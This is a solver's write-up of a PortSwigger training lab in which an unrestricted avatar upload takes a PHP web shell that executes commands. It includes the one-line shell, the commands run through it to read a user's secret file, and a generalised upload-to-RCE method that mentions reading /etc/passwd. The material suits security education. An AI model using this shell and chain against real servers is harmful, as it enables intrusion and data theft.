# PortSwigger Lab

## Lab

Remote code execution via web shell upload

URL: https://0a93004d048f8871812111f700ed0087.web-security-academy.net

## Vulnerability Class

File upload — unrestricted web shell upload (PHP) with predictable served path → RCE as app user

## Objective

Read `/home/carlos/secret` and submit its contents via `POST /submitSolution` (`{"correct":true}` + `is-solved`; official description not read).

## Initial Observations

- Blog; login `wiener:peter` → 302; account page has avatar upload `POST /my-account/avatar` (multipart: `avatar` file + `user=wiener` + `csrf`).
- Baseline PNG upload → 200 `The file avatars/t.png has been uploaded.` — storage path disclosed in response.
- Server header on errors: Apache/2.4.41 (Ubuntu) — PHP execution plausible.

## Hypotheses

- H1: No extension/MIME enforcement (or trivial) — `.php` stores as-is.
- H2: Uploaded files served executably under a predictable path (`/files/avatars/<name>`).
- H3: RCE user can read `/home/carlos/secret`; submission oracle confirms.

## Attempts

1. Baseline PNG → stored path confirmed (oracle for later URL construction).
2. `shell.php` (`<?php echo shell_exec($_GET["cmd"]); ?>`, Content-Type image/png) → `avatars/shell.php has been uploaded.` — no validation blocked it.
3. `GET /files/avatars/shell.php?cmd=id` → `uid=12002(carlos)…` — RCE first try (alt paths `/avatars/` 404, `/my-account/avatars/` 302 — only `/files/avatars/` executes).
4. POST-with-cmd variant → 405 `Method Not Allowed` — shell reads `$_GET` only; use GET query (cheap lesson, no impact).
5. `cmd=pwd` → `/var/www/html/avatars`; `ls /home/carlos/` → `secret` (32B); `cat` → `02gEo055G5Hg2IhBPDki6dGYIqDyu2dU`.
6. `POST /submitSolution answer=<secret>` → `{"correct":true}` 200; `/` → `is-solved`/`Solved`. WORKED.

## What Failed

- POST-based command passing (shell is GET-only by construction — my payload choice, not app behavior).
- Two wrong shell paths probed before the right one (404/302 vs 200+uid — path discovery, not flaw).

## What Worked

- PNG baseline (path oracle) → PHP upload (no filter) → `?cmd=id` (RCE proof) → filesystem walk → secret → submit → solved.

## Burp Observations

- Not used via Burp MCP; curl multipart sufficed. Repeater equivalent for uploads.

## Browser Observations

- Not required. No JS-dependent behavior.

## CLI / Tool Observations

- curl `-F` multipart (file + fields + csrf+session jar); `--get --data-urlencode` for GET command passing (spaces/specials); `submitSolution.js`-pattern submission (method/path/param read from prior labs' contract knowledge — verified by `{"correct":true}` here).

## Root Cause

Avatar upload performs no extension, MIME, or content validation and serves uploads from a predictable web-accessible path with script execution enabled: `shell.php` lands in `avatars/` and executes as PHP under `/files/avatars/`, yielding OS command execution as the app user (`carlos`).

## Verification

- Upload oracle (stored-path message) → execution oracle (`uid=…` output, not page render) → filesystem oracle (`secret` listing) → secret exfiltration → submission oracle (`{"correct":true}`) + `is-solved`. Each link deterministic; commands run as `carlos`.

## Impact

Full RCE as app user (demonstrated filesystem read of another user's secret); same primitive allows data theft, backdooring, and lateral movement within the host.

## Why The Successful Approach Worked

- Benign upload first gave the exact storage/serving path convention before any malicious file.
- Simplest shell + simplest execution test (`id`) proved RCE in one round trip; only then filesystem walk.
- Submission contract matched prior labs' pattern but was verified by oracle response here, not assumed solved.

## Generalization

- Avatar/attachment uploads: baseline-benign (path oracle) → extension matrix (`.php` first when stack is Apache/PHP) → `?cmd=id` execution proof → sensitive-file walk (`/home/<user>/secret`, `/etc/passwd` where readable) → submission oracle.
- `$_GET`-vs-`$_POST` shell semantics matter for invocation (405 = wrong verb, not missing flaw).
- Served-path discovery (`/files/…` vs `/avatars/…`) is part of the exploit — probe variants, read status+body.

## Lessons Learned

- Server header (Apache/PHP) + upload with no stated restrictions = try direct `.php` before exotic polyglots (cheapest test first).
- Upload message bodies are path oracles — record the exact stored path verbatim.
- First file-upload lab: upload→execute→exfiltrate→submit chain replaces auth-flow reasoning; verification is command output + oracle JSON.

## Related Methodology

- methodology/file-security.md (unrestricted upload → RCE — to be created from stub)

## References

- Solved instance: https://0a93004d048f8871812111f700ed0087.web-security-academy.net/
- Deliberately did NOT read the official solution/writeup for this lab.
